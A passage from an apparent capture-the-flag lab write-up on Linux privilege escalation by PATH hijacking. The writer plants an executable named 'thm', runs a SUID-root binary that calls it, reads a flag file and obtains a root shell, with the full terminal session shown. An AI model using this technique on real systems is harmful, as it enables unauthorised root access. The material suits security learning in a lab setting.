The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.

  

![](https://i.imgur.com/u1PM8ZD.png)  

  

At this point the path script will also look under the /tmp folder for an executable named “thm”.

Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.

  

![](https://i.imgur.com/7UdrEnd.png)  

  

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.


Now, we simply run the “test” file and it will execute our “cat” command and output the contents of the “flag6.txt” file.

>karen@ip-10-10-151-80:/home/murdoch$ touch thm
karen@ip-10-10-151-80:/home/murdoch$ echo "cat /home/matt/flag6.txt"
cat /home/matt/flag6.txt
karen@ip-10-10-151-80:/home/murdoch$ echo "cat /home/matt/flag6.txt" > thm
karen@ip-10-10-151-80:/home/murdoch$ cat thm
cat /home/matt/flag6.txt
karen@ip-10-10-151-80:/home/murdoch$ chmod 777 thm
karen@ip-10-10-151-80:/home/murdoch$ ls -al
total 36
drwxrwxrwx 2 root  root   4096 Sep 25 16:04 .
drwxr-xr-x 5 root  root   4096 Jun 20  2021 ..
-rwsr-xr-x 1 root  root  16712 Jun 20  2021 test
-rwxrwxrwx 1 karen karen    25 Sep 25 16:05 thm
-rw-rw-r-- 1 root  root     86 Jun 20  2021 thm.py
karen@ip-10-10-151-80:/home/murdoch$ nano test
Unable to create directory /home/karen/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

>karen@ip-10-10-151-80:/home/murdoch$ test
karen@ip-10-10-151-80:/home/murdoch$ ./test
THM-736628929
karen@ip-10-10-151-80:/home/murdoch$ 

If i wanted root access

>karen@ip-10-10-151-80:/home/murdoch$ echo "/bin/bash" > thm
karen@ip-10-10-151-80:/home/murdoch$ ./test
root@ip-10-10-151-80:/home/murdoch# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-151-80:/home/murdoch# 
